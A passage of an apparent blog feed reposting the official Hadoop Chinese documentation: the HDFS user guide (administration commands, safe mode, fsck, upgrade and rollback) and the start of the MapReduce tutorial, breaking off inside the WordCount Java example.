        <content type="html"><![CDATA[<p>此文章转载于<a href="http://hadoop.apache.org/docs/r1.0.4/cn/hdfs_user_guide.html" target="_blank" rel="noopener">Hadoop官方中文文档</a></p><a id="more"></a><h1 id="Hadoop分布式文件系统使用指南"><a href="#Hadoop分布式文件系统使用指南" class="headerlink" title="Hadoop分布式文件系统使用指南"></a>Hadoop分布式文件系统使用指南</h1><ul><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/hdfs_user_guide.html#目的" target="_blank" rel="noopener">目的</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/hdfs_user_guide.html#概述" target="_blank" rel="noopener">概述</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/hdfs_user_guide.html#先决条件" target="_blank" rel="noopener">先决条件</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/hdfs_user_guide.html#Web接口" target="_blank" rel="noopener">Web接口</a></li><li>Shell命令<ul><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/hdfs_user_guide.html#DFSAdmin命令" target="_blank" rel="noopener">DFSAdmin命令</a></li></ul></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/hdfs_user_guide.html#Secondary+NameNode" target="_blank" rel="noopener">Secondary NameNode</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/hdfs_user_guide.html#Rebalancer" target="_blank" rel="noopener">Rebalancer</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/hdfs_user_guide.html#机架感知（Rack+awareness）" target="_blank" rel="noopener">机架感知（Rack awareness）</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/hdfs_user_guide.html#安全模式" target="_blank" rel="noopener">安全模式</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/hdfs_user_guide.html#fsck" target="_blank" rel="noopener">fsck</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/hdfs_user_guide.html#升级和回滚" target="_blank" rel="noopener">升级和回滚</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/hdfs_user_guide.html#文件权限和安全性" target="_blank" rel="noopener">文件权限和安全性</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/hdfs_user_guide.html#可扩展性" target="_blank" rel="noopener">可扩展性</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/hdfs_user_guide.html#相关文档" target="_blank" rel="noopener">相关文档</a></li></ul><h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>本文档的目标是为Hadoop分布式文件系统（HDFS）的用户提供一个学习的起点，这里的HDFS既可以作为<a href="https://hadoop.apache.org/" target="_blank" rel="noopener">Hadoop</a>集群的一部分，也可以作为一个独立的分布式文件系统。虽然HDFS在很多环境下被设计成是可正确工作的，但是了解HDFS的工作原理对在特定集群上改进HDFS的运行性能和错误诊断都有极大的帮助。</p><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>HDFS是Hadoop应用用到的一个最主要的分布式存储系统。一个HDFS集群主要由一个NameNode和很多个Datanode组成：Namenode管理文件系统的元数据，而Datanode存储了实际的数据。HDFS的体系结构在<a href="http://hadoop.apache.org/docs/r1.0.4/cn/hdfs_design.html" target="_blank" rel="noopener">这里</a>有详细的描述。本文档主要关注用户以及管理员怎样和HDFS进行交互。<a href="http://hadoop.apache.org/docs/r1.0.4/cn/hdfs_design.html" target="_blank" rel="noopener">HDFS架构设计</a>中的<a href="http://hadoop.apache.org/docs/r1.0.4/cn/images/hdfsarchitecture.gif" target="_blank" rel="noopener">图解</a>描述了Namenode、Datanode和客户端之间的基本的交互操作。基本上，客户端联系Namenode以获取文件的元数据或修饰属性，而真正的文件I/O操作是直接和Datanode进行交互的。</p><p>下面列出了一些多数用户都比较感兴趣的重要特性。</p><ul><li>Hadoop（包括HDFS）非常适合在商用硬件（commodity hardware）上做分布式存储和计算，因为它不仅具有容错性和可扩展性，而且非常易于扩展。<a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html" target="_blank" rel="noopener">Map-Reduce</a>框架以其在大型分布式系统应用上的简单性和可用性而著称，这个框架已经被集成进Hadoop中。</li><li>HDFS的可配置性极高，同时，它的默认配置能够满足很多的安装环境。多数情况下，这些参数只在非常大规模的集群环境下才需要调整。</li><li>用Java语言开发，支持所有的主流平台。</li><li>支持类Shell命令，可直接和HDFS进行交互。</li><li>NameNode和DataNode有内置的Web服务器，方便用户检查集群的当前状态。</li><li>新特性和改进会定期加入HDFS的实现中。下面列出的是HDFS中常用特性的一部分：<ul><li>文件权限和授权。</li><li>机架感知（Rack awareness）：在调度任务和分配存储空间时考虑节点的物理位置。</li><li>安全模式：一种维护需要的管理模式。</li><li>fsck：一个诊断文件系统健康状况的工具，能够发现丢失的文件或数据块。</li><li>Rebalancer：当datanode之间数据不均衡时，平衡集群上的数据负载。</li><li>升级和回滚：在软件更新后有异常发生的情形下，能够回滚到HDFS升级之前的状态。</li><li>Secondary Namenode：对文件系统名字空间执行周期性的检查点，将Namenode上HDFS改动日志文件的大小控制在某个特定的限度下。</li></ul></li></ul><h2 id="先决条件"><a href="#先决条件" class="headerlink" title="先决条件"></a>先决条件</h2><p>下面的文档描述了如何安装和搭建Hadoop集群：</p><ul><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/quickstart.html" target="_blank" rel="noopener">Hadoop快速入门</a> 针对初次使用者。</li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/cluster_setup.html" target="_blank" rel="noopener">Hadoop集群搭建</a> 针对大规模分布式集群的搭建。</li></ul><p>文档余下部分假设用户已经安装并运行了至少包含一个Datanode节点的HDFS。就本文目的来说，Namenode和Datanode可以运行在同一个物理主机上。</p><h2 id="Web接口"><a href="#Web接口" class="headerlink" title="Web接口"></a>Web接口</h2><p>NameNode和DataNode各自启动了一个内置的Web服务器，显示了集群当前的基本状态和信息。在默认配置下NameNode的首页地址是<a href="http://namenode-name:50070/。这个页面列出了集群里的所有DataNode和集群的基本状态。这个Web接口也可以用来浏览整个文件系统（使用NameNode首页上的&quot;Browse" target="_blank" rel="noopener">http://namenode-name:50070/。这个页面列出了集群里的所有DataNode和集群的基本状态。这个Web接口也可以用来浏览整个文件系统（使用NameNode首页上的"Browse</a> the file system”链接）。</p><h2 id="Shell命令"><a href="#Shell命令" class="headerlink" title="Shell命令"></a>Shell命令</h2><p>Hadoop包括一系列的类shell的命令，可直接和HDFS以及其他Hadoop支持的文件系统进行交互。bin/hadoop fs -help 命令列出所有Hadoop Shell支持的命令。而 bin/hadoop fs -help command-name 命令能显示关于某个命令的详细信息。这些命令支持大多数普通文件系统的操作，比如复制文件、改变文件权限等。它还支持一些HDFS特有的操作，比如改变文件副本数目。</p><p>‘bin/hadoop dfsadmin’ 命令支持一些和HDFS管理相关的操作。bin/hadoop dfsadmin -help 命令能列出所有当前支持的命令。比如：</p><ul><li>-report：报告HDFS的基本统计信息。有些信息也可以在NameNode Web服务首页看到。</li><li>-safemode：虽然通常并不需要，但是管理员的确可以手动让NameNode进入或离开安全模式。</li><li>-finalizeUpgrade：删除上一次升级时制作的集群备份。</li></ul><h2 id="Secondary-NameNode"><a href="#Secondary-NameNode" class="headerlink" title="Secondary NameNode"></a>Secondary NameNode</h2><p>NameNode将对文件系统的改动追加保存到本地文件系统上的一个日志文件（edits）。当一个NameNode启动时，它首先从一个映像文件（fsimage）中读取HDFS的状态，接着应用日志文件中的edits操作。然后它将新的HDFS状态写入（fsimage）中，并使用一个空的edits文件开始正常操作。因为NameNode只有在启动阶段才合并fsimage和edits，所以久而久之日志文件可能会变得非常庞大，特别是对大型的集群。日志文件太大的另一个副作用是下一次NameNode启动会花很长时间。</p><p>Secondary NameNode定期合并fsimage和edits日志，将edits日志文件大小控制在一个限度下。因为内存需求和NameNode在一个数量级上，所以通常secondary NameNode和NameNode运行在不同的机器上。Secondary NameNode通过bin/start-dfs.sh在conf/masters中指定的节点上启动。</p><p>Secondary NameNode的检查点进程启动，是由两个配置参数控制的：</p><ul><li>fs.checkpoint.period，指定连续两次检查点的最大时间间隔， 默认值是1小时。</li><li>fs.checkpoint.size定义了edits日志文件的最大值，一旦超过这个值会导致强制执行检查点（即使没到检查点的最大时间间隔）。默认值是64MB。</li></ul><p>Secondary NameNode保存最新检查点的目录与NameNode的目录结构相同。 所以NameNode可以在需要的时候读取Secondary NameNode上的检查点镜像。</p><p>如果NameNode上除了最新的检查点以外，所有的其他的历史镜像和edits文件都丢失了， NameNode可以引入这个最新的检查点。以下操作可以实现这个功能：</p><ul><li>在配置参数dfs.name.dir指定的位置建立一个空文件夹；</li><li>把检查点目录的位置赋值给配置参数fs.checkpoint.dir；</li><li>启动NameNode，并加上-importCheckpoint。</li></ul><p>NameNode会从fs.checkpoint.dir目录读取检查点， 并把它保存在dfs.name.dir目录下。 如果dfs.name.dir目录下有合法的镜像文件，NameNode会启动失败。 NameNode会检查fs.checkpoint.dir目录下镜像文件的一致性，但是不会去改动它。</p><p>命令的使用方法请参考<a href="http://hadoop.apache.org/docs/r1.0.4/cn/commands_manual.html#secondarynamenode" target="_blank" rel="noopener">secondarynamenode 命令</a>.</p><h2 id="Rebalancer"><a href="#Rebalancer" class="headerlink" title="Rebalancer"></a>Rebalancer</h2><p>HDFS的数据也许并不是非常均匀的分布在各个DataNode中。一个常见的原因是在现有的集群上经常会增添新的DataNode节点。当新增一个数据块（一个文件的数据被保存在一系列的块中）时，NameNode在选择DataNode接收这个数据块之前，会考虑到很多因素。其中的一些考虑的是：</p><ul><li>将数据块的一个副本放在正在写这个数据块的节点上。</li><li>尽量将数据块的不同副本分布在不同的机架上，这样集群可在完全失去某一机架的情况下还能存活。</li><li>一个副本通常被放置在和写文件的节点同一机架的某个节点上，这样可以减少跨越机架的网络I/O。</li><li>尽量均匀地将HDFS数据分布在集群的DataNode中。</li></ul><p>由于上述多种考虑需要取舍，数据可能并不会均匀分布在DataNode中。HDFS为管理员提供了一个工具，用于分析数据块分布和重新平衡DataNode上的数据分布。<a href="http://issues.apache.org/jira/browse/HADOOP-1652" target="_blank" rel="noopener">HADOOP-1652</a>的附件中的一个<a href="http://issues.apache.org/jira/secure/attachment/12368261/RebalanceDesign6.pdf" target="_blank" rel="noopener">PDF</a>是一个简要的rebalancer管理员指南。</p><p>使用方法请参考<a href="http://hadoop.apache.org/docs/r1.0.4/cn/commands_manual.html#balancer" target="_blank" rel="noopener">balancer 命令</a>.</p><h2 id="机架感知（Rack-awareness）"><a href="#机架感知（Rack-awareness）" class="headerlink" title="机架感知（Rack awareness）"></a>机架感知（Rack awareness）</h2><p>通常，大型Hadoop集群是以机架的形式来组织的，同一个机架上不同节点间的网络状况比不同机架之间的更为理想。另外，NameNode设法将数据块副本保存在不同的机架上以提高容错性。Hadoop允许集群的管理员通过配置dfs.network.script参数来确定节点所处的机架。当这个脚本配置完毕，每个节点都会运行这个脚本来获取它的机架ID。默认的安装假定所有的节点属于同一个机架。这个特性及其配置参数在<a href="http://issues.apache.org/jira/browse/HADOOP-692" target="_blank" rel="noopener">HADOOP-692</a>所附的<a href="http://issues.apache.org/jira/secure/attachment/12345251/Rack_aware_HDFS_proposal.pdf" target="_blank" rel="noopener">PDF</a>上有更详细的描述。</p><h2 id="安全模式"><a href="#安全模式" class="headerlink" title="安全模式"></a>安全模式</h2><p>NameNode启动时会从fsimage和edits日志文件中装载文件系统的状态信息，接着它等待各个DataNode向它报告它们各自的数据块状态，这样，NameNode就不会过早地开始复制数据块，即使在副本充足的情况下。这个阶段，NameNode处于安全模式下。NameNode的安全模式本质上是HDFS集群的一种只读模式，此时集群不允许任何对文件系统或者数据块修改的操作。通常NameNode会在开始阶段自动地退出安全模式。如果需要，你也可以通过’bin/hadoop dfsadmin -safemode’命令显式地将HDFS置于安全模式。NameNode首页会显示当前是否处于安全模式。关于安全模式的更多介绍和配置信息请参考JavaDoc：<a href="https://hadoop.apache.org/core/docs/current/api/org/apache/hadoop/dfs/NameNode.html#setSafeMode(org.apache.hadoop.dfs.FSConstants.SafeModeAction)" target="_blank" rel="noopener">setSafeMode()</a>。</p><h2 id="fsck"><a href="#fsck" class="headerlink" title="fsck"></a>fsck</h2><p>HDFS支持fsck命令来检查系统中的各种不一致状况。这个命令被设计来报告各种文件存在的问题，比如文件缺少数据块或者副本数目不够。不同于在本地文件系统上传统的fsck工具，这个命令并不会修正它检测到的错误。一般来说，NameNode会自动修正大多数可恢复的错误。HDFS的fsck不是一个Hadoop shell命令。它通过’bin/hadoop fsck’执行。 命令的使用方法请参考<a href="http://hadoop.apache.org/docs/r1.0.4/cn/commands_manual.html#fsck" target="_blank" rel="noopener">fsck命令</a> fsck可用来检查整个文件系统，也可以只检查部分文件。</p><h2 id="升级和回滚"><a href="#升级和回滚" class="headerlink" title="升级和回滚"></a>升级和回滚</h2><p>当在一个已有集群上升级Hadoop时，像其他的软件升级一样，可能会有新的bug或一些会影响到现有应用的非兼容性变更出现。在任何有实际意义的HDSF系统上，丢失数据是不被允许的，更不用说重新搭建启动HDFS了。HDFS允许管理员退回到之前的Hadoop版本，并将集群的状态回滚到升级之前。更多关于HDFS升级的细节在[升级wiki](<a href="https://wiki.apache.org/hadoop/Hadoop" target="_blank" rel="noopener">https://wiki.apache.org/hadoop/Hadoop</a> Upgrade)上可以找到。HDFS在一个时间可以有一个这样的备份。在升级之前，管理员需要用bin/hadoop dfsadmin -finalizeUpgrade（升级终结操作）命令删除存在的备份文件。下面简单介绍一下一般的升级过程：</p><ul><li>升级 Hadoop 软件之前，请检查是否已经存在一个备份，如果存在，可执行升级终结操作删除这个备份。通过dfsadmin -upgradeProgress status命令能够知道是否需要对一个集群执行升级终结操作。</li><li>停止集群并部署新版本的Hadoop。</li><li>使用-upgrade选项运行新的版本（bin/start-dfs.sh -upgrade）。</li><li>在大多数情况下，集群都能够正常运行。一旦我们认为新的HDFS运行正常（也许经过几天的操作之后），就可以对之执行升级终结操作。注意，在对一个集群执行升级终结操作之前，删除那些升级前就已经存在的文件并不会真正地释放DataNodes上的磁盘空间。</li><li>如果需要退回到老版本，<ul><li>停止集群并且部署老版本的Hadoop。</li><li>用回滚选项启动集群（bin/start-dfs.h -rollback）。</li></ul></li></ul><h2 id="文件权限和安全性"><a href="#文件权限和安全性" class="headerlink" title="文件权限和安全性"></a>文件权限和安全性</h2><p>这里的文件权限和其他常见平台如Linux的文件权限类似。目前，安全性仅限于简单的文件权限。启动NameNode的用户被视为HDFS的超级用户。HDFS以后的版本将会支持网络验证协议（比如Kerberos）来对用户身份进行验证和对数据进行加密传输。具体的细节请参考<a href="http://hadoop.apache.org/docs/r1.0.4/cn/hdfs_permissions_guide.html" target="_blank" rel="noopener">权限使用管理指南</a>。</p><h2 id="可扩展性"><a href="#可扩展性" class="headerlink" title="可扩展性"></a>可扩展性</h2><p>现在，Hadoop已经运行在上千个节点的集群上。<a href="https://wiki.apache.org/hadoop/PoweredBy" target="_blank" rel="noopener">Powered By Hadoop</a>页面列出了一些已将Hadoop部署在他们的大型集群上的组织。HDFS集群只有一个NameNode节点。目前，NameNode上可用内存大小是一个主要的扩展限制。在超大型的集群中，增大HDFS存储文件的平均大小能够增大集群的规模，而不需要增加NameNode的内存。默认配置也许并不适合超大规模的集群。<a href="https://wiki.apache.org/hadoop/FAQ" target="_blank" rel="noopener">Hadoop FAQ</a>页面列举了针对大型Hadoop集群的配置改进。</p><h2 id="相关文档"><a href="#相关文档" class="headerlink" title="相关文档"></a>相关文档</h2><p>这个用户手册给用户提供了一个学习和使用HDSF文件系统的起点。本文档会不断地进行改进，同时，用户也可以参考更多的Hadoop和HDFS文档。下面的列表是用户继续学习的起点：</p><ul><li><a href="https://hadoop.apache.org/" target="_blank" rel="noopener">Hadoop官方主页</a>：所有Hadoop相关的起始页。</li><li><a href="https://wiki.apache.org/hadoop/FrontPage" target="_blank" rel="noopener">Hadoop Wiki</a>：Hadoop Wiki文档首页。这个指南是Hadoop代码树中的一部分，与此不同，Hadoop Wiki是由Hadoop社区定期编辑的。</li><li>Hadoop Wiki上的<a href="https://wiki.apache.org/hadoop/FAQ" target="_blank" rel="noopener">FAQ</a>。</li><li>Hadoop <a href="https://hadoop.apache.org/core/docs/current/api/" target="_blank" rel="noopener">JavaDoc API</a>。</li><li>Hadoop用户邮件列表：<a href="mailto:core-user@hadoop.apache.org">core-user[at]hadoop.apache.org</a>。</li><li>查看conf/hadoop-default.xml文件。这里包括了大多数配置参数的简要描述。</li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/commands_manual.html" target="_blank" rel="noopener">命令手册</a>：命令使用说明。</li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 大数据技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hadoop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hadoop MapReduce教程</title>
      <link href="/2020/06/25/Hadoop-MapReduce%E6%95%99%E7%A8%8B/"/>
      <url>/2020/06/25/Hadoop-MapReduce%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p>此文章转载于<a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html" target="_blank" rel="noopener">Hadoop官方中文文档</a></p><a id="more"></a><ul><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#目的" target="_blank" rel="noopener">目的</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#先决条件" target="_blank" rel="noopener">先决条件</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#概述" target="_blank" rel="noopener">概述</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#输入与输出" target="_blank" rel="noopener">输入与输出</a></li><li>例子：WordCount v1.0<ul><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#源代码" target="_blank" rel="noopener">源代码</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#用法" target="_blank" rel="noopener">用法</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#解释" target="_blank" rel="noopener">解释</a></li></ul></li><li>Map/Reduce - 用户界面<ul><li>核心功能描述<ul><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#Mapper" target="_blank" rel="noopener">Mapper</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#Reducer" target="_blank" rel="noopener">Reducer</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#Partitioner" target="_blank" rel="noopener">Partitioner</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#Reporter" target="_blank" rel="noopener">Reporter</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#OutputCollector" target="_blank" rel="noopener">OutputCollector</a></li></ul></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#作业配置" target="_blank" rel="noopener">作业配置</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#任务的执行和环境" target="_blank" rel="noopener">任务的执行和环境</a></li><li>作业的提交与监控<ul><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#作业的控制" target="_blank" rel="noopener">作业的控制</a></li></ul></li><li>作业的输入<ul><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#InputSplit" target="_blank" rel="noopener">InputSplit</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#RecordReader" target="_blank" rel="noopener">RecordReader</a></li></ul></li><li>作业的输出<ul><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#任务的Side-Effect+File" target="_blank" rel="noopener">任务的Side-Effect File</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#RecordWriter" target="_blank" rel="noopener">RecordWriter</a></li></ul></li><li>其他有用的特性<ul><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#Counters" target="_blank" rel="noopener">Counters</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#DistributedCache" target="_blank" rel="noopener">DistributedCache</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#Tool" target="_blank" rel="noopener">Tool</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#IsolationRunner" target="_blank" rel="noopener">IsolationRunner</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#Profiling" target="_blank" rel="noopener">Profiling</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#调试" target="_blank" rel="noopener">调试</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#JobControl" target="_blank" rel="noopener">JobControl</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#数据压缩" target="_blank" rel="noopener">数据压缩</a></li></ul></li></ul></li><li>例子：WordCount v2.0<ul><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#源代码-N10DC0" target="_blank" rel="noopener">源代码</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#运行样例" target="_blank" rel="noopener">运行样例</a></li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/mapred_tutorial.html#程序要点" target="_blank" rel="noopener">程序要点</a></li></ul></li></ul><h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>这篇教程从用户的角度出发，全面地介绍了Hadoop Map/Reduce框架的各个方面。</p><h2 id="先决条件"><a href="#先决条件" class="headerlink" title="先决条件"></a>先决条件</h2><p>请先确认Hadoop被正确安装、配置和正常运行中。更多信息见：</p><ul><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/quickstart.html" target="_blank" rel="noopener">Hadoop快速入门</a>对初次使用者。</li><li><a href="http://hadoop.apache.org/docs/r1.0.4/cn/cluster_setup.html" target="_blank" rel="noopener">Hadoop集群搭建</a>对大规模分布式集群。</li></ul><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>Hadoop Map/Reduce是一个使用简易的软件框架，基于它写出来的应用程序能够运行在由上千个商用机器组成的大型集群上，并以一种可靠容错的方式并行处理上T级别的数据集。</p><p>一个Map/Reduce <em>作业（job）</em> 通常会把输入的数据集切分为若干独立的数据块，由 <em>map任务（task）</em>以完全并行的方式处理它们。框架会对map的输出先进行排序， 然后把结果输入给<em>reduce任务</em>。通常作业的输入和输出都会被存储在文件系统中。 整个框架负责任务的调度和监控，以及重新执行已经失败的任务。</p><p>通常，Map/Reduce框架和<a href="http://hadoop.apache.org/docs/r1.0.4/cn/hdfs_design.html" target="_blank" rel="noopener">分布式文件系统</a>是运行在一组相同的节点上的，也就是说，计算节点和存储节点通常在一起。这种配置允许框架在那些已经存好数据的节点上高效地调度任务，这可以使整个集群的网络带宽被非常高效地利用。</p><p>Map/Reduce框架由一个单独的master JobTracker 和每个集群节点一个slave TaskTracker共同组成。master负责调度构成一个作业的所有任务，这些任务分布在不同的slave上，master监控它们的执行，重新执行已经失败的任务。而slave仅负责执行由master指派的任务。</p><p>应用程序至少应该指明输入/输出的位置（路径），并通过实现合适的接口或抽象类提供map和reduce函数。再加上其他作业的参数，就构成了<em>作业配置（job configuration）</em>。然后，Hadoop的 <em>job client</em>提交作业（jar包/可执行程序等）和配置信息给JobTracker，后者负责分发这些软件和配置信息给slave、调度任务并监控它们的执行，同时提供状态和诊断信息给job-client。</p><p>虽然Hadoop框架是用JavaTM实现的，但Map/Reduce应用程序则不一定要用 Java来写 。</p><ul><li><a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/streaming/package-summary.html" target="_blank" rel="noopener">Hadoop Streaming</a>是一种运行作业的实用工具，它允许用户创建和运行任何可执行程序 （例如：Shell工具）来做为mapper和reducer。</li><li><a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/mapred/pipes/package-summary.html" target="_blank" rel="noopener">Hadoop Pipes</a>是一个与<a href="http://www.swig.org/" target="_blank" rel="noopener">SWIG</a>兼容的C++ API （没有基于JNITM技术），它也可用于实现Map/Reduce应用程序。</li></ul><h2 id="输入与输出"><a href="#输入与输出" class="headerlink" title="输入与输出"></a>输入与输出</h2><p>Map/Reduce框架运转在&lt;key, value&gt; 键值对上，也就是说， 框架把作业的输入看为是一组&lt;key, value&gt; 键值对，同样也产出一组 &lt;key, value&gt; 键值对做为作业的输出，这两组键值对的类型可能不同。</p><p>框架需要对key和value的类(classes)进行序列化操作， 因此，这些类需要实现 <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/io/Writable.html" target="_blank" rel="noopener">Writable</a>接口。 另外，为了方便框架执行排序操作，key类必须实现 <a href="https://hadoop.apache.org/core/docs/r0.18.2/api/org/apache/hadoop/io/WritableComparable.html" target="_blank" rel="noopener">WritableComparable</a>接口。</p><p>一个Map/Reduce 作业的输入和输出类型如下所示：</p><p>(input) &lt;k1, v1&gt; -&gt; <strong>map</strong> -&gt; &lt;k2, v2&gt; -&gt; <strong>combine</strong> -&gt; &lt;k2, v2&gt; -&gt; <strong>reduce</strong> -&gt; &lt;k3, v3&gt; (output)</p><h2 id="例子：WordCount-v1-0"><a href="#例子：WordCount-v1-0" class="headerlink" title="例子：WordCount v1.0"></a>例子：WordCount v1.0</h2><p>在深入细节之前，让我们先看一个Map/Reduce的应用示例，以便对它们的工作方式有一个初步的认识。</p><p>WordCount是一个简单的应用，它可以计算出指定数据集中每一个单词出现的次数。</p><p>这个应用适用于 <a href="http://hadoop.apache.org/docs/r1.0.4/cn/quickstart.html#Standalone+Operation" target="_blank" rel="noopener">单机模式</a>， <a href="http://hadoop.apache.org/docs/r1.0.4/cn/quickstart.html#SingleNodeSetup" target="_blank" rel="noopener">伪分布式模式</a> 或 <a href="http://hadoop.apache.org/docs/r1.0.4/cn/quickstart.html#Fully-Distributed+Operation" target="_blank" rel="noopener">完全分布式模式</a> 三种Hadoop安装方式。</p><p><strong>源代码</strong></p><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.myorg;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">import</span> java.util.*;<span class="hljs-keyword">import</span> org.apache.hadoop.fs.Path;<span class="hljs-keyword">import</span> org.apache.hadoop.conf.*;<span class="hljs-keyword">import</span> org.apache.hadoop.io.*;<span class="hljs-keyword">import</span> org.apache.hadoop.mapred.*;<span class="hljs-keyword">import</span> org.apache.hadoop.util.*;<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WordCount</span> </span>{   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Map</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">MapReduceBase</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Mapper</span>&lt;<span class="hljs-title">LongWritable</span>, <span class="hljs-title">Text</span>, <span class="hljs-title">Text</span>, <span class="hljs-title">IntWritable</span>&gt; </span>{ <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">static</span> IntWritable one = <span class="hljs-keyword">new</span> IntWritable(<span class="hljs-number">1</span>); <span class="hljs-keyword">private</span> Text word = <span class="hljs-keyword">new</span> Text(); <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">map</span><span class="hljs-params">(LongWritable key, Text value, OutputCollector&lt;Text, IntWritable&gt; output, Reporter reporter)</span> <span class="hljs-keyword">throws</span> IOException </span>{   String line = value.toString();   StringTokenizer tokenizer = <span class="hljs-keyword">new</span> StringTokenizer(line);   <span class="hljs-keyword">while</span> (tokenizer.hasMoreTokens()) { word.set(tokenizer.nextToken()); output.collect(word, one);   } }   }   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Reduce</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">MapReduceBase</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Reducer</span>&lt;<span class="hljs-title">Text</span>, <span class="hljs-title">IntWritable</span>, <span class="hljs-title">Text</span>, <span class="hljs-title">IntWritable</span>&gt; </span>{ <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">reduce</span><span class="hljs-params">(Text key, Iterator&lt;IntWritable&gt; values, OutputCollector&lt;Text, IntWritable&gt; output, Reporter reporter)</span> <span class="hljs-keyword">throws</span> IOException </span>{   <span class="hljs-keyword">int</span> sum = <span class="hljs-number">0</span>;   <span class="hljs-keyword">while</span> (values.hasNext()) { sum += values.next().get();   }   output.collect(key, <span class="hljs-keyword">new</span> IntWritable(sum)); }   }   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>{ JobConf conf = <span 